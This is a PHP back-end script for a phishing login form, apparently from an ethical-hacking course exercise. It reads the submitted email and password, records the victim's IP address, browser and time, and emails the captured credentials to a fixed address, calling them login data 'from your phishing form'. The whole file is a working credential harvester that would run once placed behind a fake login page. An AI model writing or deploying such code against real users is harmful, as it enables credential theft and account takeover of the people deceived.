<?php

// set the default timezone to use and set date variable
$recvDate = date('l jS \of F Y h:i:s A');

// an email address that will be in the From field of the email.
$from = 'ceh-minor-ethical-hacking@damiaentoussaint.nl';

// an email address that will receive the email with the output of the form
$sendTo = 'account-security-team-ceh@damiaentoussaint.nl';

// subject of the email
$subject = 'WhiteHatReport: Received new login on form!';

// form field names and their translations.
$fields = array('form_email' => 'Email', 'form_password' => 'Password');

// Get client ip adress
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// All of the data that we want to have, we define here
$browser = $_SERVER['HTTP_USER_AGENT'];

try
{
    // Check if the form has been filled
    if(count($_POST) == 0) throw new \Exception('Form is empty');

    // Email main body text
    $emailText = "You have recieved new login data from your phishing form: \n\nClient Data: \n\tSender Browser: $browser\n\tSender IP: $ip\n\tLogin at: $recvDate\n\nForm Data: \n";

    // Iterate through all of the fields from the post request
    foreach ($_POST as $key => $value) {
        // If the field exists in the $fields array, include it in the email
        if (isset($fields[$key])) {
            $emailText .= "\t$fields[$key]: $value\n";
        }
    }

    // All the neccessary headers for the email.
    $headers = array('Content-Type: text/plain; charset="UTF-8";',
        'From: ' . $from,
        'Reply-To: ' . $from,
        'Return-Path: ' . $from,
    );

    // After completing mail building send mail
    mail($sendTo, $subject, $emailText, implode("\n", $headers));

    // Return response for the site, later on use for redirecting
    $responseArray = array('type' => 'success');
}
catch (\Exception $e)
{
    var_dump($e);
    $responseArray = array('type' => 'error', 'message' => $e);
}


// if requested by AJAX request return JSON response
if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    $encoded = json_encode($responseArray);

    header('Content-Type: application/json');

    echo $encoded;
}
